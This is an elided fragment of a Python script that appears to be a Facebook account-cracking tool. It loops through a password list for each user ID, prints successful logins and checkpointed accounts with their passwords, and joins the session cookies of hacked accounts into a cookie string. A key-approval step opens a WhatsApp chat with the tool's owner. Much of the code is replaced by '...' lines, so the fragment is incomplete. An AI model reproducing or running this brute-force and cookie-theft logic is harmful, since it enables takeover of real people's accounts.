                ...
                for pas in passlist:
                        ...
                        if 'your account was locked' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [XB-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[1;31m [XB-CP] '+str(uid)+' | '+pas+'\033[1;97m')
...
def main_apv():
    ...
    if key1 in r1:
        ...
        tks = ('Hello%20SEBTI%20Owner%20OUSSAMA-XB%20!!%20Please%20Approve%20My%20Key%20Key%20:%20'+key1);os.system('am start https://wa.me/+923239021979?text='+tks)
        menu()
menu()
